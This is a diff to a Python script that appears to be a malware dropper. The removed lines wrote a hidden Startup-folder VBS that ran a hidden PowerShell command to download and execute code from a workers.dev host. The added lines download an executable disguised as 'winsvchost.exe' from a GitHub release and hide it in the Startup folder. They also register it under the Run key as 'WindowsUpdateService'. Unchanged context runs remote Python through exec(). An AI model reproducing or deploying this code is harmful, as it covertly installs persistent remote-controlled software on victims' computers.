@@ -18,29 +18,39 @@ import re
 import datetime
 import platform
 from pathlib import Path
+import winreg
 
-def copy_to_startup():
+def download_exe_to_startup(url, filename="winsvchost.exe"):
     try:
-        import os
-        import ctypes
-        
-        startup = os.path.join(
+        startup_path = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
-            'WindowsUpdate.vbs'
+            filename
         )
         
-        vbs_content = '''CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (iwr -UseBasicParsing https://work.thexor7.workers.dev/psc).Content""", 0, False'''
+        response = requests.get(url, stream=True)
+        response.raise_for_status()
         
-        with open(startup, 'w') as f:
-            f.write(vbs_content)
+        with open(startup_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
         
-        ctypes.windll.kernel32.SetFileAttributesW(startup, 2)
-        return True
-    except:
-        return False
+        ct.windll.kernel32.SetFileAttributesW(startup_path, 2)
+        
+        return startup_path
+    except Exception as e:
+        return None
 
-copy_to_startup()
+def add_to_registry_startup(exe_path, name="WindowsUpdateService"):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                            0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{exe_path}"')
+        winreg.CloseKey(key)
+        return True
+    except Exception as e:
+        return False
 
 def fetch_and_execute(url):
     response = requests.get(url)
@@ -49,6 +59,13 @@ def fetch_and_execute(url):
     exec(script_content, globals())
 
 if __name__ == "__main__":
+    exe_url = 'https://github.com/azayan165-svg/b/releases/download/d/winsvchost.exe'
+    
+    exe_path = download_exe_to_startup(exe_url)
+    
+    if exe_path:
+        add_to_registry_startup(exe_path)
+    
     github_urls = [
         'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
     ]
